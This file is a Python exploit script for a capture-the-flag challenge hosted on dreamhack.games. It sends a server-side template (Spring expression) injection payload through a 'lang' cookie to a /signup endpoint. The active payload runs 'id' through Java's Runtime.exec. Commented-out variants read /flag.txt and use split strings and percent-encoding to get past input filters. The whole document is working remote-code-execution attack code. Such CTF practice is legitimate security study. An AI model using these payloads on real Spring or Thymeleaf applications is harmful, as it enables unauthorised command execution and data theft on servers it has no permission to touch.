import base64
import requests
from urllib import parse

def url_encode(string):
    return "".join("%{0:0>2}".format(format(ord(char), "x")) for char in string)

def exploit(url, query):
    cookies = {
        'lang': query
    }
    res = requests.get(url + '/signup', cookies=cookies)
    print(res.text)
    print(res.status_code)

if __name__ == "__main__":
    # payload = '{7*7}'
    
    # payload = "new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('cat /flag.txt').getInputStream()).next()"
    # payload = url_encode(payload)
    
    # payload = "T(Void).TYPE.forName(%22ja%22+%22va.util.Scanner%22).getConstructor(T(Void).TYPE.forName(%22ja%22+%22va.io.InputStream%22)).newInstance(T(Void).TYPE.forName(%22jav%22+%22a.lang.Run%22+%22time%22).getMethods()[6].invoke(null).exec(%22cat%20/flag.txt%22).getInputStream()).next()"

    payload = "new%20j%61va.util.Scanner(T(j%61va.lang.Runtim%65).getRuntim%65().exec(%22id%22).getInputStream()).next()"
    query = f'__$%7b{payload}%7d__::.x'
    url = 'http://host1.dreamhack.games:22535'
    exploit(url, query)